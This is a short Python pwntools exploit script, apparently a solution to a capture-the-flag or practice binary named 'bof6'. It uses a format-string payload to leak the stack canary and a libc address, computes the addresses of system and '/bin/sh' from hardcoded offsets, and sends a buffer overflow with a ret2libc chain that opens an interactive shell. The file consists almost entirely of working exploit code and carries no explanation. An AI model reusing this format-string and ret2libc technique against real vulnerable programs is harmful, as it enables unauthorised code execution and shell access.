from pwn import *


offset = 64
canary = "%11$x-%12$p"

b = ELF('./bof6')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
sysdiff =  abs(libc.symbols['__libc_start_main'] - libc.symbols['system'])
binshdiff = abs(libc.symbols['__libc_start_main'] - libc.search('/bin/sh').next())

p = process('./bof6')
print p.recvline()
p.sendline(canary)

leak = p.recvline().split(' ')[3].replace('\n','')
somelibcleak = leak.split('-')[1]
canaryleak = leak.split('-')[0]

log.info("Canary leak : " + canaryleak)
log.info("somelibcleak : " + somelibcleak)
log.info("Libc Start : " + hex(b.symbols['__libc_start_main']))
print p.recv()
print util.proc.pidof(p)
# gdb.attach(p,'''
# b *0x0804859d
# b *main+216
# ''')
#
# pause()
x2minusx1 = 0x19b24c # leak - system
x4minusx3 = 0x56614 # leak - binsh
system = p32(int(somelibcleak,16) - x2minusx1 + sysdiff)
binsh = p32(int(somelibcleak,16) - x4minusx3  + binshdiff - 0x144c38 )
p.sendline("A"*64 + p32(int(canaryleak,16)) + "B"*12 + system + "TROL" + binsh)
p.interactive()
# print p.recv()
